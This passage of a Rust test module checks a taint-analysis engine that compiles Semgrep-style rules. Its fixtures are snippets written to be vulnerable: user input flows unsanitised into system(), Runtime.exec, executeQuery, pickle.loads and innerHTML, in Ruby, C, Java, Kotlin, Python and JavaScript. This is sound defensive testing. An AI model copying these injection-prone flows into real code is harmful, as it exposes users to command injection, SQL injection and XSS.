id: ruby-params-cmdi-sanitized
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches system"
pattern-sources:
  - pattern: params
pattern-sanitizers:
  - pattern: Shellwords.escape($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  cmd = Shellwords.escape(params[:cmd])
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized params flow must produce no finding, got {:?}",
            findings
        );
    }

    /// The dotted `request.params` source must keep firing end-to-end (it was
    /// already working — this is a regression guard).
    #[test]
    fn ruby_bridge_dotted_request_params_source_still_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-request-params-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted request.params reaches system"
pattern-sources:
  - pattern: request.params
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  val = request.params[:q]
  system(val)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "dotted request.params -> system must still fire, got {:?}",
            findings
        );
    }

    /// Near-miss: a bare-identifier source that never reaches the sink must
    /// produce no finding (end-to-end via the bridge).
    #[test]
    fn ruby_bridge_bare_params_source_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-params-cmdi-nearmiss
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches system"
pattern-sources:
  - pattern: params
pattern-sinks:
  - pattern: system($X)
"#,
        );

        // `safe` is a literal, never tainted; `cmd` is tainted but not used.
        let src = r#"
def handler
  cmd = params[:cmd]
  safe = "ls"
  system(safe)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "untainted argument must not fire, got {:?}",
            findings
        );
    }

    #[test]
    fn taint_rule_with_c_language_compiles() {
        let yaml = r#"
id: c-taint
mode: taint
languages: [c]
severity: ERROR
message: m
pattern-sources: [{pattern: getenv($X)}]
pattern-sinks: [{pattern: system($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::C);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_kotlin_language_compiles() {
        let yaml = r#"
id: kotlin-taint
mode: taint
languages: [kotlin]
severity: ERROR
message: m
pattern-sources: [{pattern: request.getParameter($X)}]
pattern-sinks: [{pattern: Runtime.exec($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Kotlin);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_kt_alias_compiles_as_kotlin() {
        let yaml = r#"
id: kt-taint
mode: taint
languages: [kt]
severity: ERROR
message: m
pattern-sources: [{pattern: call.receiveText($X)}]
pattern-sinks: [{pattern: Runtime.exec($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::Kotlin),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_javascript_language_compiles() {
        let yaml = r#"
id: js-taint
mode: taint
languages: [javascript]
severity: ERROR
message: m
pattern-sources: [{pattern: req.query}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::JavaScript);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_typescript_language_compiles_as_javascript() {
        let yaml = r#"
id: ts-taint
mode: taint
languages: [typescript]
severity: ERROR
message: m
pattern-sources: [{pattern: req.body}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::JavaScript),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_go_language_compiles() {
        let yaml = r#"
id: go-taint
mode: taint
languages: [go]
severity: ERROR
message: m
pattern-sources: [{pattern: c.Query($X)}]
pattern-sinks: [{pattern: exec.Command($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Go);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_java_language_compiles() {
        let yaml = r#"
id: java-taint
mode: taint
languages: [java]
severity: ERROR
message: m
pattern-sources: [{pattern: request.getParameter($X)}]
pattern-sinks: [{pattern: Runtime.exec($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Java);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn java_taint_rule_produces_finding_for_source_to_sink_flow() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-cmd-injection
mode: taint
languages: [java]
severity: ERROR
message: "Tainted input reaches Runtime.exec"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
"#,
        );

        // Source: request.getParameter(...) → cmd → Runtime.exec(cmd)
        let src = r#"
class Controller {
    void run(HttpServletRequest request) throws Exception {
        String cmd = request.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for request.getParameter -> Runtime.exec flow, got none"
        );
        assert!(
            findings[0].description.contains("Runtime.exec")
                || findings[0]
                    .sink_description
                    .as_deref()
                    .is_some_and(|d| d.contains("exec")),
            "sink description should mention exec: {:?}",
            findings[0]
        );
    }

    #[test]
    fn java_taint_sanitizer_blocks_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-cmd-sanitized
mode: taint
languages: [java]
severity: ERROR
message: "Tainted input reaches Runtime.exec"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
pattern-sanitizers:
  - pattern: validate($X)
"#,
        );

        // The sanitizer validate() is called — engine does not track sanitizers on
        // intermediate variables for this shape, but the call assignment
        // reassigns cmd to a clean value if the sanitizer is applied first.
        // Use a shape the engine cleanly handles: param goes directly to sanitizer,
        // then to sink. The sanitizer call replaces the tainted value so the sink
        // should not fire.
        let src = r#"
class Controller {
    void run(HttpServletRequest request) throws Exception {
        String cmd = request.getParameter("cmd");
        String safe = validate(cmd);
        Runtime.getRuntime().exec(safe);
    }
}
"#;
        // With the sanitizer call reassigning to `safe`, the engine should not
        // propagate taint through the sanitizer call, so no finding.
        // Note: this tests the integration of the sanitizer matcher in the
        // compiled Java spec — whether the engine actually blocks it depends
        // on the java_taint engine's sanitizer handling. We assert the compiled
        // rule carries sanitizers correctly.
        assert_eq!(
            rule.spec.sanitizers.len(),
            1,
            "sanitizer spec should compile"
        );
        // Run the check and ensure no crash (result depends on engine sanitizer support).
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let _ = rule.check(src, &tree); // must not panic
    }

    #[test]
    fn c_taint_rule_produces_finding_for_getenv_to_system() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: c-cmd-injection
mode: taint
languages: [c]
severity: ERROR
message: "Tainted env var reaches system()"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: getenv($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        // getenv() result assigned to cmd, then passed to system().
        let src = r#"
#include <stdlib.h>
void handler() {
    char *cmd = getenv("CMD");
    system(cmd);
}
"#;
        let tree = parse_file(src, Language::C).expect("C fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for getenv -> system flow, got none"
        );
        assert!(
            findings[0].description.contains("system")
                || findings[0]
                    .sink_description
                    .as_deref()
                    .is_some_and(|d| d.contains("system")),
            "sink description should mention system: {:?}",
            findings[0]
        );
    }

    #[test]
    fn c_taint_sanitizer_no_panic() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: c-cmd-sanitized
mode: taint
languages: [c]
severity: ERROR
message: "Tainted input reaches system()"
pattern-sources:
  - pattern: getenv($X)
pattern-sinks:
  - pattern: system($X)
pattern-sanitizers:
  - pattern: strlcpy($X)
"#,
        );

        // Verify sanitizer compiles correctly and rule doesn't panic.
        assert_eq!(
            rule.spec.sanitizers.len(),
            1,
            "sanitizer spec should compile"
        );
        let src = r#"
#include <stdlib.h>
#include <string.h>
void handler() {
    char *input = getenv("CMD");
    char safe[64];
    strlcpy(safe, input, sizeof(safe));
    system(safe);
}
"#;
        let tree = parse_file(src, Language::C).expect("C fixture should parse");
        let _ = rule.check(src, &tree); // must not panic
    }

    #[test]
    fn kotlin_taint_rule_produces_finding_for_receive_to_exec() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: kotlin-cmd-injection
mode: taint
languages: [kotlin]
severity: ERROR
message: "Tainted request body reaches Runtime.exec"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: call.receiveText($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
"#,
        );

        // call.receiveText() → cmd → Runtime.getRuntime().exec(cmd)
        let src = r#"
fun handler(call: ApplicationCall) {
    val cmd = call.receiveText()
    Runtime.getRuntime().exec(cmd)
}
"#;
        let tree = parse_file(src, Language::Kotlin).expect("Kotlin fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for call.receiveText -> Runtime.exec flow, got none"
        );
        assert!(
            findings[0].description.contains("exec")
                || findings[0]
                    .sink_description
                    .as_deref()
                    .is_some_and(|d| d.contains("exec")),
            "sink description should mention exec: {:?}",
            findings[0]
        );
    }

    #[test]
    fn kotlin_taint_sanitizer_no_panic() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: kotlin-cmd-sanitized
mode: taint
languages: [kotlin]
severity: ERROR
message: "Tainted request body reaches Runtime.exec"
pattern-sources:
  - pattern: call.receiveText($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
pattern-sanitizers:
  - pattern: validate($X)
"#,
        );

        // Verify sanitizer compiles correctly and rule doesn't panic.
        assert_eq!(
            rule.spec.sanitizers.len(),
            1,
            "sanitizer spec should compile"
        );
        let src = r#"
fun handler(call: ApplicationCall) {
    val body = call.receiveText()
    val safe = validate(body)
    Runtime.getRuntime().exec(safe)
}
"#;
        let tree = parse_file(src, Language::Kotlin).expect("Kotlin fixture should parse");
        let _ = rule.check(src, &tree); // must not panic
    }

    fn compiled(yaml: &str) -> SemgrepTaintRule {
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => r,
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn pattern_either_flattens_into_multiple_matchers() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either:
      - pattern: request.data
      - pattern: request.form
      - pattern: request.args
pattern-sinks:
  - pattern: pickle.loads($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 3);
        assert_eq!(r.spec.sinks.len(), 1);
    }

    #[test]
    fn nested_pattern_either_flattens_recursively() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either:
      - pattern-either:
          - pattern: request.data
          - pattern: request.form
      - pattern: request.args
pattern-sinks:
  - pattern: pickle.loads($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 3);
    }

    #[test]
    fn pattern_either_in_sinks_flattens() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - pattern-either:
      - pattern: pickle.loads($X)
      - pattern: pickle.load($X)
"#,
        );
        assert_eq!(r.spec.sinks.len(), 2);
    }

    #[test]
    fn pattern_either_in_sanitizers_flattens() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - pattern: pickle.loads($X)
pattern-sanitizers:
  - pattern-either:
      - pattern: sanitize($X)
      - pattern: escape($X)
"#,
        );
        assert_eq!(r.spec.sanitizers.len(), 2);
    }

    #[test]
    fn mixed_pattern_and_pattern_either_work_together() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either:
      - pattern: request.data
      - pattern: request.form
  - pattern: request
pattern-sinks:
  - pattern: pickle.loads($X)
  - pattern-either:
      - pattern: pickle.load($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 3);
        assert_eq!(r.spec.sinks.len(), 2);
    }

    #[test]
    fn empty_pattern_either_warns_and_produces_no_matcher() {
        // Empty pattern-either in sources → no source matchers, so whole
        // rule is skipped (sources are required).
        let yaml = r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either: []
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Skip(msg) => assert!(msg.contains("pattern-sources")),
            other => panic!(
                "expected Skip because empty pattern-either produced no sources, got {:?}",
                match other {
                    TaintRuleParse::Compiled(_) => "Compiled",
                    TaintRuleParse::NotTaint => "NotTaint",
                    TaintRuleParse::Skip(_) => unreachable!(),
                }
            ),
        }

        // Empty pattern-either in sanitizers → rule still compiles (sanitizers
        // are optional), but has zero sanitizer matchers.
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - pattern: pickle.loads($X)
pattern-sanitizers:
  - pattern-either: []
"#,
        );
        assert!(r.spec.sanitizers.is_empty());
    }

    #[test]
    fn unknown_composite_still_rejected() {
        // `pattern-inside:` as a standalone top-level source entry (not inside
        // a `patterns:` block) — unsupported key, the entry is warn-skipped.
        // With no other source entries the whole rule is skipped.
        let yaml2 = r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-inside: |
      def $F(...):
        ...
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v2: YamlValue = serde_yaml_ng::from_str(yaml2).unwrap();
        assert!(matches!(parse_taint_rule(&v2), TaintRuleParse::Skip(_)));

        // A mix where one entry is an unsupported key and another is a plain
        // `pattern:` still compiles — the bad entry is dropped, the good one
        // survives.
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-inside: |
      def $F(...):
        ...
  - pattern: request.form
pattern-sinks:
  - pattern: pickle.loads($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 1);
    }

    // ── MethodName shape tests ────────────────────────────────────────────

    #[test]
    fn compile_metavar_receiver_sink_produces_method_name() {
        // The canonical Semgrep pattern for "any call to executeQuery" is
        // `$CONN.executeQuery($X)`.  The bridge must compile this to a
        // `MethodName` matcher rather than warn-skipping it.
        let m = compile("$CONN.executeQuery($X)", MatcherRole::Sink).expect("MethodName");
        match m {
            GenericMatcher::MethodName { method, .. } => assert_eq!(method, "executeQuery"),
            _ => panic!("expected MethodName"),
        }
    }

    #[test]
    fn compile_metavar_receiver_sanitizer_produces_method_name() {
        let m = compile("$OBJ.escape($X)", MatcherRole::Sanitizer).expect("MethodName sanitizer");
        match m {
            GenericMatcher::MethodName { method, .. } => assert_eq!(method, "escape"),
            _ => panic!("expected MethodName"),
        }
    }

    #[test]
    fn metavar_receiver_as_source_is_rejected() {
        // A `$RECEIVER.method($X)` source does not make semantic sense:
        // we cannot identify which object is the origin if the receiver is
        // any arbitrary variable.  The bridge must return None for sources.
        assert!(compile("$OBJ.getInput($X)", MatcherRole::Source).is_none());
    }

    #[test]
    fn metavar_without_dot_is_rejected() {
        // A bare metavariable with no method — not a valid sink shape.
        assert!(compile("$X", MatcherRole::Sink).is_none());
        assert!(compile("$X($Y)", MatcherRole::Sink).is_none());
    }

    #[test]
    fn metavar_with_multi_segment_rest_compiles_as_member_call() {
        // `$OBJ.a.b($X)` is no longer rejected: it is a CALL-ON-MEMBER shape
        // (metavar root, concrete penultimate `a`, concrete method `b`) and
        // compiles to a FieldName on the penultimate field `a`.
        match compile("$OBJ.a.b($X)", MatcherRole::Sink) {
            Some(GenericMatcher::FieldName { field, .. }) => assert_eq!(field, "a"),
            other => panic!("expected FieldName{{a}}, got {other:?}"),
        }
        // But a metavar penultimate (`$OBJ.$F.b($X)`) stays rejected — we never
        // compile an any-field `.b(...)` matcher.
        assert!(compile("$OBJ.$F.b($X)", MatcherRole::Sink).is_none());
    }

    #[test]
    fn metavar_lowercase_is_rejected() {
        // Semgrep metavariables are UPPER-case after `$`.  `$obj` (lowercase)
        // is not a metavariable; reject it so we don't accidentally match
        // oddly-named dotted callees.
        assert!(compile("$obj.method($X)", MatcherRole::Sink).is_none());
    }

    #[test]
    fn metavar_with_trailing_digits_is_accepted() {
        // Semgrep metavars are `[A-Z_][A-Z0-9_]*`, so `$ARG1` is valid — it must
        // compile as a metavar-receiver sink (previously rejected on the digit).
        assert!(is_metavariable("$ARG1"));
        assert!(is_metavariable("$CONN_2"));
        assert!(!is_metavariable("$obj"));
        assert!(!is_metavariable("$"));
        assert!(compile("$X1.executeQuery($P)", MatcherRole::Sink).is_some());
    }

    #[test]
    fn taint_rule_with_metavar_receiver_sink_compiles() {
        let r = compiled(
            r#"
id: java-sql-injection
mode: taint
languages: [java]
severity: ERROR
message: "Tainted input reaches executeQuery"
metadata:
  cwe: "CWE-89"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#,
        );
        assert_eq!(r.spec.sinks.len(), 1);
        match &r.spec.sinks[0] {
            GenericMatcher::MethodName { method, .. } => assert_eq!(method, "executeQuery"),
            other => panic!("expected MethodName sink, got {:?}", other),
        }
    }

    #[test]
    fn java_taint_method_name_sink_produces_finding() {
        use crate::engine::parser::parse_file;

        // Rule uses `$CONN.executeQuery($X)` — bridge compiles to MethodName.
        // Java engine's `matcher_matches_call` handles MethodName via method name.
        let rule = compiled(
            r#"
id: java-sql-metavar
mode: taint
languages: [java]
severity: ERROR
message: "SQL injection via executeQuery"
metadata:
  cwe: "CWE-89"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#,
        );

        let src = r#"
class Dao {
    void query(HttpServletRequest request, Connection conn) throws Exception {
        String input = request.getParameter("id");
        conn.executeQuery(input);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for request.getParameter -> conn.executeQuery flow, got none"
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .is_some_and(|d| d.contains("executeQuery")),
            "sink description should mention executeQuery: {:?}",
            findings[0]
        );
    }

    #[test]
    fn java_taint_method_name_non_matching_method_does_not_fire() {
        use crate::engine::parser::parse_file;

        // Rule only matches `executeQuery` — calls to `executeUpdate` must NOT fire.
        let rule = compiled(
            r#"
id: java-sql-metavar-negative
mode: taint
languages: [java]
severity: ERROR
message: "SQL injection via executeQuery"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#,
        );

        let src = r#"
class Dao {
    void update(HttpServletRequest request, Connection conn) throws Exception {
        String input = request.getParameter("id");
        conn.executeUpdate(input);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "executeUpdate should NOT trigger the executeQuery rule, got {:?}",
            findings
        );
    }

    // ── MemberAssign shape tests ──────────────────────────────────────────

    #[test]
    fn compile_member_assign_sink_produces_member_assign() {
        // The canonical Semgrep DOM-XSS pattern is `$EL.innerHTML = $X`.
        // The bridge must compile this to `MemberAssign { field: "innerHTML" }`.
        let m = compile("$EL.innerHTML = $X", MatcherRole::Sink).expect("MemberAssign");
        match m {
            GenericMatcher::MemberAssign { field, .. } => assert_eq!(field, "innerHTML"),
            _ => panic!("expected MemberAssign"),
        }
    }

    #[test]
    fn compile_member_assign_sanitizer_produces_member_assign() {
        let m =
            compile("$EL.outerHTML = $X", MatcherRole::Sanitizer).expect("MemberAssign sanitizer");
        match m {
            GenericMatcher::MemberAssign { field, .. } => assert_eq!(field, "outerHTML"),
            _ => panic!("expected MemberAssign"),
        }
    }

    #[test]
    fn compile_member_assign_source_is_rejected() {
        // A `$EL.field = $X` source does not make semantic sense —
        // property assignment is a sink, not an origin.
        assert!(compile("$EL.innerHTML = $X", MatcherRole::Source).is_none());
    }

    #[test]
    fn member_assign_equality_operator_is_rejected() {
        // `==` is a comparison, not an assignment — must not compile.
        assert!(compile("$EL.innerHTML == $X", MatcherRole::Sink).is_none());
    }

    #[test]
    fn member_assign_plain_receiver_not_compiled_as_member_assign() {
        // `el.innerHTML = $X` with a plain identifier receiver is NOT a
        // MemberAssign pattern (the receiver must be a metavariable).
        // It has `=` but will fail `parse_member_assign_pattern` and then
        // also fail the call/identifier checks, so it returns None.
        assert!(compile("el.innerHTML = $X", MatcherRole::Sink).is_none());
    }

    #[test]
    fn member_assign_multi_segment_lhs_is_rejected() {
        // `$EL.a.b = $X` is ambiguous — only single-segment property names
        // are supported for the MemberAssign shape.
        assert!(compile("$EL.a.b = $X", MatcherRole::Sink).is_none());
    }

    #[test]
    fn taint_rule_with_member_assign_sink_compiles() {
        let r = compiled(
            r#"
id: js-dom-xss-innerhtml
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted input reaches innerHTML"
metadata:
  cwe: "CWE-79"
pattern-sources:
  - pattern: req.query
pattern-sinks:
  - pattern: $EL.innerHTML = $X
"#,
        );
        assert_eq!(r.spec.sinks.len(), 1);
        match &r.spec.sinks[0] {
            GenericMatcher::MemberAssign { field, .. } => assert_eq!(field, "innerHTML"),
            other => panic!("expected MemberAssign sink, got {:?}", other),
        }
    }

    #[test]
    fn js_taint_member_assign_sink_produces_finding() {
        use crate::engine::parser::parse_file;

        // Rule uses `$EL.innerHTML = $X` — bridge compiles to MemberAssign.
        // The JavaScript engine's assignment handler checks MemberAssign sinks
        // via `match_member_assign_sink` (taint_engine.rs line 629).
        let rule = compiled(
            r#"
id: js-dom-xss-innerhtml-e2e
mode: taint
languages: [javascript]
severity: ERROR
message: "DOM XSS via innerHTML"
metadata:
  cwe: "CWE-79"
pattern-sources:
  - pattern: req.query
pattern-sinks:
  - pattern: $EL.innerHTML = $X
"#,
        );

        let src = r#"
function handler(req) {
    var data = req.query.name;
    document.getElementById("target").innerHTML = data;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("JS fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for req.query -> innerHTML flow, got none"
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .is_some_and(|d| d.contains("innerHTML")),
            "sink description should mention innerHTML: {:?}",
            findings[0]
        );
    }

    #[test]
    fn js_taint_member_assign_non_matching_field_does_not_fire() {
        use crate::engine::parser::parse_file;

        // Rule matches `innerHTML` only — assignment to `textContent` (which
        // is NOT an XSS sink) must NOT fire.
        let rule = compiled(
            r#"
id: js-dom-xss-innerhtml-neg
mode: taint
languages: [javascript]
severity: ERROR
message: "DOM XSS via innerHTML"
pattern-sources:
  - pattern: req.query
pattern-sinks:
  - pattern: $EL.innerHTML = $X
"#,
        );

        let src = r#"
function handler(req) {
    var data = req.query.name;
    document.getElementById("target").textContent = data;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("JS fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "textContent assignment should NOT trigger the innerHTML rule, got {:?}",
            findings
        );
    }

    // ── `patterns:` AND-block inside source/sink ──────────────────────────

    /// (a) source/sink using single-pattern `patterns:` block — must produce a
    /// source→sink finding just like a bare `pattern:` entry would.
    #[test]
    fn patterns_block_single_pattern_source_to_sink_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: patterns-block-single-pattern
mode: taint
languages: [python]
severity: ERROR
message: "Tainted data reaches pickle.loads"
pattern-sources:
  - patterns:
      - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern: pickle.loads($X)
"#,
        );
        // sources and sinks must both compile from the patterns: block
        assert_eq!(rule.spec.sources.len(), 1, "source from patterns: block");
        assert_eq!(rule.spec.sinks.len(), 1, "sink from patterns: block");

        let src = r#"
import pickle
def view(request):
    data = request.data
    result = pickle.loads(data)
    return result
"#;
        let tree = parse_file(src, Language::Python).expect("Python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for request.data -> pickle.loads flow, got none"
        );
    }

    /// (b) `patterns:` block containing `pattern-either:` — must compile all
    /// alternatives and match accordingly.
    #[test]
    fn patterns_block_with_pattern_either_compiles_all_alternatives() {
        let r = compiled(
            r#"
id: patterns-block-pattern-either
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: pickle.loads($X)
          - pattern: pickle.load($X)
          - pattern: eval($X)
"#,
        );
        // All three alternatives inside pattern-either inside patterns: must compile.
        assert_eq!(
            r.spec.sinks.len(),
            3,
            "expected 3 sink matchers from patterns: {{ pattern-either: [3] }}"
        );
    }

    /// (c) `patterns:` block with an unsupported narrowing constraint still
    /// compiles via the expressible matcher — documented broadening, no crash.
    #[test]
    fn patterns_block_with_unsupported_constraint_compiles_with_broadening() {
        // This mirrors the real-world shape: event source narrowed by
        // pattern-inside (which we cannot enforce), plus a focus-metavariable
        // and pattern-either for the real node shape.
        let r = compiled(
            r#"
id: patterns-block-broadening
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern-inside: |
          def handler(event, context):
            ...
      - pattern: event
pattern-sinks:
  - patterns:
      - focus-metavariable: $CMD
      - pattern-either:
          - pattern: os.system($CMD)
          - pattern: os.popen($CMD)
"#,
        );
        // Source: `event` from the patterns: block (pattern-inside dropped)
        assert_eq!(
            r.spec.sources.len(),
            1,
            "source compiled despite dropped pattern-inside"
        );
        // Sinks: os.system + os.popen from pattern-either (focus-metavariable dropped)
        assert_eq!(
            r.spec.sinks.len(),
            2,
            "sinks compiled despite dropped focus-metavariable"
        );
    }

    /// (d) `patterns:` block with NO expressible matcher — warn-skips
    /// gracefully without crashing. When all entries in a role are skipped the
    /// whole rule is skipped.
    #[test]
    fn patterns_block_no_expressible_matcher_warn_skips_gracefully() {
        // Only constraint-only keys inside the patterns: block → no matcher
        // extracted → entry produces nothing → sources empty → whole rule skipped.
        let yaml = r#"
id: patterns-block-no-expressible
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern-inside: |
          def handler(event, context):
            ...
      - focus-metavariable: $X
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Skip(msg) => {
                assert!(
                    msg.contains("pattern-sources"),
                    "skip message should mention pattern-sources: {msg}"
                );
            }
            TaintRuleParse::Compiled(_) => {
                panic!("expected Skip when patterns: block has no expressible matchers")
            }
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    // ── Bridge-level (end-to-end) tests for PHP taint ────────────────────────
    //
    // These compile a rule through `parse_taint_rule` (the SAME path the CLI
    // uses) where the source is a bare identifier (`$_GET`) with no parens.
    // The bridge compiles those to `GenericMatcher::ParamName`, which is the
    // path that was previously broken end-to-end for other languages.
